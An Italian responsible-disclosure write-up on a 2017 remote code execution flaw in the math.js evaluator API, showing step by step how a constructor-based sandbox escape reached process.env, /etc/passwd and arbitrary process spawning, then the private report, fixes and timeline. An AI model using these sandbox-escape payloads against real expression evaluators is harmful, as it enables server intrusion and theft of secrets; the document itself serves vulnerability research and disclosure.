Come abbiamo exploitato una vulnerabilità di remote code execution in math.js
====

Questo articolo spiega in breve come abbiamo trovato, exploitato e segnalato una vulnerabilità di remote code execution (RCE). È fatto per essere una guida su come trovare vulnerabilità, e come segnalarle in modo responsabile.

## Prima fase: scoperta
Sperimentando con [un wrapper](https://github.com/LucentW/s-uzzbot/blob/master/plugins/calculator.lua) dell'API math.js (`http://api.mathjs.org/v1/?expr=expression-here`), abbiamo scoperto che **sembra eseguire del codice JavaScript**, anche se con alcune restrizioni:

```
!calc cos
Result: function
!calc eval
Result: function
!calc eval("x => x")
Error: Value expected (char 3)
!calc eval("console.log")
Error: Undefined symbol console
!calc eval("return 1")
Result: 1
```

In particolare, sembra che `eval` sia stato sostituito con una versione sicura. Neanche `Function` e `setTimeout` funzionano:

```
!calc Function("return 1")
Error: Undefined symbol Function
!calc setTimeout
Error: Undefined symbol Function
```

## Seconda fase: exploit

>Dopo aver capito che ci sono delle restrizioni sull'esecuzione del codice, abbiamo dovuto capire come aggirarle.

In JavaScript ci sono quattro modi di **eseguire delle stringhe**:

  - [`eval("codice")`](https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/eval)
  - [`new Function("codice")`](https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/Function)
  - [`setTimeout("code", timeout)`](https://developer.mozilla.org/it/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)
  - [`setInterval("code", interval)`](https://developer.mozilla.org/it/docs/Web/API/WindowOrWorkerGlobalScope/setInterval)

Nell'ambiente math.js, non possiamo accedere direttamente a queste funzioni, o perché non sono definite o perché sono state ridefinite perché siano sicure. Tuttavia, ci si può accedere indirettamente: in particolare, **si puà accedere indirettamente a `Function` come construttore di una funzione esistente** - questa è stata l'intuizione chiave che ha portato all'exploit.

>Per esempio, `Function("return 1")` può essere sostituito con `Math.floor.constructor("return 1")`. Perciò, per eseguire `return 1`, possiamo usare `Math.floor.constructor("return 1")()`.

Sappiamo che in math.js `cos` è definito come una funzione, per cui l'abbiamo usata:

```
!calc cos.constructor("return 1")()
Result: 1
```

Funziona!

Da qua avremmo potuto semplicemente usare `require` con dei moduli nativi e avere accesso al sistema operativo, giusto? Purtroppo no: nonostante il server dell'API math.js giri in un ambiente Node.js, per qualche motivo non possiamo usare `require`.

```
!calc cos.constructor("return require")()
Error: require is not defined
```

Tuttavia abbiamo potuto usare `process`, che ha [diverse funzionalità carine](https://nodejs.org/api/process.html):

```
!calc cos.constructor("return process")()
Result: [object process]
!calc cos.constructor("return process.env")()
Result: {"WEB_MEMORY": "512", "MEMORY_AVAILABLE": "512", "NEW_RELIC_LOG": "stdout", "NEW_RELIC_LICENSE_KEY": "<censurato>", "DYNO": "web.1", "PAPERTRAIL_API_TOKEN": "<censurato>", "PATH": "/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin", "WEB_CONCURRENCY": "1", "PWD": "/app", "NODE_ENV": "production", "PS1": "\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]", "SHLVL": "1", "HOME": "/app", "PORT": "<censurato>", "NODE_HOME": "/app/.heroku/node", "_": "/app/.heroku/node/bin/node"}
```

Nonostante `process.env` contenga alcune informazioni interessanti, non possiamo usarlo per fare nulla di interessante: dobbiamo andare più in fondo e usare [`process.binding`](http://stackoverflow.com/q/24042861), che esponde dei binding Javascript all'OS. Nonostante non siano presenti nella documentazione ufficiale, si può determinare il loro funzionamento leggendo il codice sorgente di Node.js. Ad esempio, possiamo usare `process.binding("fs")` per leggere qualsiasi file sul disco (se abbiamo i permessi necessari):

>Per brevità, salteremo il wrapper `!calc cos.constructor("code")`, e presenteremo solo il codice JS.

```
buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer
Result: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
<more users...>
```

Abbiamo quasi finito: dobbiamo solo capire come aprire una shell ed eseguire un qualsiasi comando. Chi ha esperienza con Node.js sarà a conoscenza di [`child_process`](https://nodejs.org/api/child_process.html), che può essere usato per spawnare processi tramite `spawnSync`: dobbiamo solo re-implementare `child_process` usando i binding al SO (ricordiamo che non possiamo usare `require`).

È più facile di quanto sembri: basta prendere [il codice sorgente di `child_process`](https://github.com/nodejs/node/blob/master/lib/child_process.js), rimuovere il codice che non ci serve (funzioni inutilizzate e gestione degli errori), minificarlo ed eseguirlo nell'API ([qua il codice](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822)). Una volta fatto questo, **possiamo spawnare un qualsiasi processo** ed eseguire comandi nella shell:

```
return spawnSync('/usr/bin/whoami');
Result: {"status": 0, "signal": null, "output": [null, u15104, ], "pid": 100, "stdout": u15104, "stderr": }
```

## Fase tre: segnalazione

Dopo aver trovato una vulnerabilità e l'abbiamo sfruttata al massimo, abbiamo dovuto decidere cosa farci. Poiché l'abbiamo exploitata per divertimento e non abbiamo scopi criminali, abbiamo scelto di fare i "white hat" e di segnalarlo all'autore. L'abbiamo **contattato in privato** tramite l'indirizzo e-mail sul suo profilo GitHub con questi dettagli:

 - una breve descrizione della vulnerabilità (una RCE in mathjs.eval);
 - un **attacco di esempio** con una spiegazione di come funzionasse (una spiegazione del perché `cos.constructor("code")()` funzionasse e di cosa si potesse fare con `process.bindings`);
 - una **dimostrazione** sul server live (abbiamo incluso l'output di `whoami` e `uname -a`);
 - suggerimenti su **come sistemare la vulnerabilità** (ad esempio, usando [il modulo `vm` in Node.js](https://nodejs.org/api/vm.html)).

Abbiamo lavorato con l'autore per due giorni per aiutarlo a sistemare la vulnerabilità. In particolare, dopo la fix inclusa in [`2f45600`](https://github.com/josdejong/mathjs/commit/2f456009056bc332673f45ca143d4d92c8c7b159) abbiamo trovato un altro modo di aggirarla (se non si può usare direttamente il costruttore, basta usare `cos.constructor.apply(null, "code")()`) che è stato sistemato in [`3c3517d`](https://github.com/josdejong/mathjs/commit/3c3517daa6412457826b79b60368d8e8e415a7dd).

### Timeline
 - 26 Marzo 2017 22:20 CEST: primo exploit avvenuto con successo
 - 29 Marzo 2017 14:43 CEST: la vulnerabilità è stata segnalata all'autore
 - 31 Marzo 2017 12:35 CEST: la seconda vulnerabilità (`.apply`) è stata segnalata
 - 31 Marzo 2017 13:52 CEST: sono state sistemate entrambe le vulnerabilità

---

>La vulnerabilità è stata scoperta da [\@CapacitorSet](https://github.com/CapacitorSet) e [\@denysvitali](https://github.com/denysvitali). Ringraziamo [\@josdejong](https://github.com/josdejong/) per aver fixato la vulnerabilità con prontezza, e [JSFuck](http://www.jsfuck.com/) per aver scoperto il trucco di usare `[].filter.constructor`.
>
><small>Rilasciato sotto la licenza [**CC-BY 4.0**](https://creativecommons.org/licenses/by/4.0/).